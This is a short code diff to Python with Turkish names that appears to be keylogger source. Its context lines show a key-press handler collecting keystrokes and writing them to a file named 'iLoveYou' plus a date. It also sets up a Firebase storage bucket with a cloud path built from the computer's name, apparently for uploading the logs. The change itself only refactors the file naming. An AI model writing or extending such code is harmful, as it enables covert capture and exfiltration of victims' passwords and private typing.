@@ -41,8 +41,8 @@ firebase_admin.initialize_app(cred, {"storageBucket": "storage bucketiniz"})
 
 bucket = storage.bucket()
 
-yerel_dosya = "iLoveYou"
-bulut_path = f"{bilgisayar_adi}/iLoveYou{guncel_tarih}"
+yerel_dosya = f"iLoveYou{guncel_tarih}"
+bulut_path = f"{bilgisayar_adi}/{yerel_dosya}"
 
 sayac = 0
 def tus_basildi(key):
@@ -63,7 +63,7 @@ def tus_basildi(key):
         keys = []
 
 def dosyaya_yaz(keys):
-    with open("iLoveYou.txt", "a", encoding="utf-8") as file:
+    with open(yerel_dosya, "a", encoding="utf-8") as file:
 
 
         for key in keys:
